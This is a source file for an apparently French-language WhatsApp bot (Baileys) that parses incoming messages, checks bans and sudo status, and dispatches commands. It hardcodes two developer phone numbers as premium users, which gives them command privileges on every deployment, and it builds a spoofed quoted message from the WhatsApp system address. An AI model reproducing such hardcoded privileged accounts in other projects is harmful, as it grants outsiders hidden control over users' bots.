const { Bans } = require("../DataBase/ban");
const { Sudo } = require('../DataBase/sudo');
const { jidDecode, getContentType } = require("@whiskeysockets/baileys");
const evt = require("../lib/ovlcmd");
const config = require("../set");
const prefixe = config.PREFIXE || "";
const getJid = require("./cache_jid");

async function message_upsert(m, ovl) {
  try {
    if (m.type !== 'notify') return;
    const ms = m.messages?.[0];
    if (!ms?.message) return;

    const decodeJid = (jid) => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        const d = jidDecode(jid) || {};
        return (d.user && d.server && `${d.user}@${d.server}`) || jid;
      }
      return jid;
    };

    const mtype = getContentType(ms.message);
    const texte = {
      conversation: ms.message.conversation,
      imageMessage: ms.message.imageMessage?.caption,
      videoMessage: ms.message.videoMessage?.caption,
      extendedTextMessage: ms.message.extendedTextMessage?.text,
      buttonsResponseMessage: ms.message.buttonsResponseMessage?.selectedButtonId,
      listResponseMessage: ms.message.listResponseMessage?.singleSelectReply?.selectedRowId,
      messageContextInfo:
        ms.message.buttonsResponseMessage?.selectedButtonId ||
        ms.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
        ms.text
    }[mtype] || "";

    const ms_org = ms.key.remoteJid;
    const id_Bot = decodeJid(ovl.user.id);
    const id_Bot_N = id_Bot.split('@')[0];

    const verif_Groupe = ms_org.endsWith("@g.us");
    const infos_Groupe = verif_Groupe ? await ovl.groupMetadata(ms_org) : {};
    const nom_Groupe = infos_Groupe.subject || "";
    const mbre_membre = verif_Groupe ? infos_Groupe.participants : [];
    const groupe_Admin = mbre_membre.filter(p => p.admin).map(p => p.jid);
    const verif_Ovl_Admin = verif_Groupe && groupe_Admin.includes(id_Bot);

    const msg_Repondu = ms.message?.[mtype]?.contextInfo?.quotedMessage;
    const auteur_Msg_Repondu = await getJid(
      decodeJid(ms.message.extendedTextMessage?.contextInfo?.participant),
      ms_org,
      ovl
    );
    const mentionnes = ms.message?.[mtype]?.contextInfo?.mentionedJid || [];
    const mention_JID = await Promise.all(mentionnes.map(lid => getJid(lid, ms_org, ovl)));
    const auteur_Message = verif_Groupe
      ? await getJid(decodeJid(ms.key.participant), ms_org, ovl)
      : ms.key.fromMe ? id_Bot : decodeJid(ms.key.remoteJid);

    const nom_Auteur_Message = ms.pushName;

    let arg = texte.trim().split(/ +/).slice(1);

    for (let i = 0; i < arg.length; i++) {
      if (arg[i].startsWith('@')) {
        const rawId = arg[i].replace(/^@/, '');
        arg[i] = await getJid(rawId + "@lid", ms_org, ovl);
      }
    }

    const isCmd = texte.startsWith(prefixe);
    const cmdName = isCmd ? texte.slice(prefixe.length).trim().split(/ +/)[0].toLowerCase() : "";

    const Ainz = '22651463203';
    const Ainzbot = '22605463559';
    const devNumbers = [Ainz, Ainzbot];

    async function getSudoUsers() {
      try {
        const sudos = await Sudo.findAll({ attributes: ['id'] });
        return sudos.map(e => e.id.replace(/[^0-9]/g, ""));
      } catch (err) {
        console.error("Erreur récupération sudo:", err);
        return [];
      }
    }

    function toJID(entry) {
      if (typeof entry !== 'string') return '';
      return entry.endsWith('@s.whatsapp.net')
        ? entry
        : `${entry.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
    }

    const sudoUsers = await getSudoUsers();
    const premiumUsers = [Ainz, Ainzbot, id_Bot_N, config.NUMERO_OWNER, ...sudoUsers].map(toJID);
    const prenium_id = premiumUsers.includes(auteur_Message);
    const dev_num = devNumbers.map(n => `${n}@s.whatsapp.net`);
    const dev_id = dev_num.includes(auteur_Message);
    const verif_Admin = verif_Groupe && (groupe_Admin.includes(auteur_Message) || prenium_id);
    const ms_badge = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: '0@s.whatsapp.net',
  },
  message: {
    extendedTextMessage: {
      text: 'ɴᴇᴏ-ʙᴏᴛ-ᴍᴅ ʙʏ ᴀɪɴᴢ',
      contextInfo: {
        mentionedJid: [],
      },
    },
  }
};
    const repondre = (msg) => ovl.sendMessage(ms_org, { text: msg }, { quoted: ms });

    const cmd_options = {
      verif_Groupe,
      mbre_membre,
      membre_Groupe: auteur_Message,
      verif_Admin,
      infos_Groupe,
      nom_Groupe,
      auteur_Message,
      nom_Auteur_Message,
      id_Bot,
      prenium_id,
      dev_id,
      dev_num,
      id_Bot_N,
      verif_Ovl_Admin,
      prefixe,
      arg,
      repondre,
      groupe_Admin: () => groupe_Admin,
      msg_Repondu,
      auteur_Msg_Repondu,
      ms,
      ms_org,
      texte,
      getJid,
      mention_JID
    };

    async function isBanned(type, id) {
      const ban = await Bans.findOne({ where: { id, type } });
      return !!ban;
    }

    if (isCmd) {
      const cd = evt.cmd.find(c => c.nom_cmd === cmdName || c.alias?.includes(cmdName));
      if (cd) {
        try {
          if (config.MODE !== 'public' && !prenium_id) return;
          if ((!dev_id && auteur_Message !== '221772430620@s.whatsapp.net') && ms_org === "120363314687943170@g.us") return;
          if (!prenium_id && await isBanned('user', auteur_Message)) return;
          if (!prenium_id && verif_Groupe && await isBanned('group', ms_org)) return;

          await ovl.sendMessage(ms_org, { react: { text: cd.react || "🎐", key: ms.key } });
          cd.fonction(ms_org, ovl, cmd_options);
        } catch (e) {
          console.error("Erreur:", e);
          ovl.sendMessage(ms_org, { text: "Erreur: " + e }, { quoted: ms });
        }
      }
    }

    for (const cmd of evt.func) {
      try {
        await cmd.fonction(ms_org, ovl, cmd_options);
      } catch (err) {
        console.error(`Erreur dans la fonction isfunc '${cmd.nom_cmd}':`, err);
      }
    }

  } catch (e) {
    console.error("❌ Erreur(message.upsert):", e);
  }
}

module.exports = message_upsert;
